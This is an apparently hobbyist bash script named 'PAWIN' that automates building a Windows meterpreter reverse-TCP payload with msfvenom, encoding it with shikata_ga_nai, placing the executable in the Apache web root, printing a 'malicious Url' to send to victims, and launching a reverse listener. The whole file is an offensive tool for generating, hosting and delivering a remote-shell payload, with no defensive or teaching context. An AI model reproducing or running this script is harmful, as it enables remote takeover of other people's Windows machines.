#!/bin/bash

figlet "PAWIN" | lolcat

service apache2 start

#cd /var/www/html

echo "Enter the IP Address of your Attacking machine: "
read IP

echo "Enter the port you wish to listen through: "
read port

echo "Enter the name you wish give to your payload: "

read name
echo "Please wait while your $name payload build up..." | lolcat

msfvenom -p windows/meterpreter/reverse_tcp lhost=$IP lport=$port -e x86/shikata_ga_nai -f exe > $name.exe
echo "Congratulations! $name payload has been built." | lolcat

echo "Do you want to send the payload to /var/www/html/  now ? [y/N] please press your answer twice" | lolcat
read response

old_stty_cfg=$(stty -g)
stty raw -echo
answer=$( while ! head -c 1 | grep -i '[ny]' ;do true ;done )
stty $old_stty_cfg
if echo "$answer" | grep -iq "^y" ;then
     	echo "Copying $name payload to /var/www/html... " | lolcat
        cp $name.exe /var/www/html/
        echo "$name payload has been Copied successfuly!" | lolcat
        echo "Your malicious Url is http://"$IP"/"$name".exe" | lolcat
else
	figlet $name | lolcat
    	exit;
fi


 
echo "Do you wish to create a reverse listener now? [y/N] please press your answer twice" 
read reverse
old_stty_cfg=$(stty -g)
stty raw -echo
reverse=$( while ! head -c 1 | grep -i '[ny]' ;do true ;done )
stty $old_stty_cfg
if echo "$reverse" | grep -iq "^y" ;then
     	echo "follow the instructions below to create a reverse listener"
        figlet "$name.exe" | lolcat
        ./meta.sh
else
	exit;
fi



	




